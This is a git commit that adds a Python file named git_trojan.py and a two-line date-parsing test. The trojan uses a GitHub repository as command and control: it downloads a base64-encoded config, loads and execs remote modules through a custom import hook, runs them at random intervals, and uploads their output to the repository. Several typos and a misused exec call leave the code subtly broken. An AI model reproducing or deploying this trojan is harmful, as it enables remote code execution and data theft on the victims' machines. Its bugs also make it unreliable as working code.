d843b6cbabe25600d50e1a695048bbcadba93eb7
ryo <ryo.nakamura1415@gmail.com>
2018-09-14 13:20:45 +0900

    Add git_trojan.py

---
+++ git_trojan.py
@@ -0,0 +1,102 @@
+import json
+import base64
+import sys
+import time
+import importlib
+import random
+import threading
+import queue
+import os
+from github3 import login
+
+trojan_id = "abc"
+
+trojan_config  = "%s.json" % trojan_id
+data_path      = "data/%s/" % trojan_id
+trojan_modules = []
+configured     = False
+task_queue     = queue.Queue()
+
+def connect_to_github():
+    gh = login(username="username", password="password")
+    repo = gh.repository("username", "config")
+    branch = repo.branch("master")
+
+    return gh,repo,branch
+
+def get_file_contents(filepath):
+    gh,repo,branch = connect_to_github()
+    #print(vars(branch.commit.commit.tree))
+    tree = branch.commit.commit.tree.to_tree().recurse()
+
+    for filename in tree.tree:
+        if filepath in filename.path:
+            print("[*] Found file %s" % filepath)
+            blob= repo.blob(filename._json_data['sha'])
+            return blob.content
+
+    return None
+
+def get_trojan_config():
+    global configured
+    config_json = get_file_contents(trojan_config)
+    b64=base64.b64decode(config_json)
+    print(b64)
+    config      = json.loads(b64)
+    configured  = True
+
+    for task in config:
+        if task['module'] not in sys.modules:
+            exec("improt %s" % task['module'])
+
+    return config
+
+def store_module_result(data):
+    gh,repo,branch = connect_to_github()
+    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
+    repo.create_file(remote_path, "Commit message" , base64.b64encode(data))
+    return
+
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self, fullname, path=None):
+        if configured:
+            print("[*] Attempting to retrive %s" % fullname)
+            new_library = get_file_contents("modules/%s" % fullname)
+
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+
+        return None
+
+    def load_module(self, name):
+        module = importlib.import_module(name)
+        exec( self.current_module_code in module.__dict__)
+        sys.modules[name] = module
+
+        return module
+
+def module_runner(module):
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+
+    store_module_result(result)
+
+    return
+
+sys.meta_path = [GitImporter()]
+
+while True:
+    if task_queue.empty():
+        config = get_trojan_config()
+
+        for task in config:
+            t = threading.Thread(target=module_runnner, args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1, 10))
+    time.sleep(random.randint(1000,10000))
+
---
+++ test.py
@@ -0,0 +1,2 @@
+from datetime import datetime
+print(datetime.strptime("21/11/06 16:30", "%d/%m/%y %H:%M"))
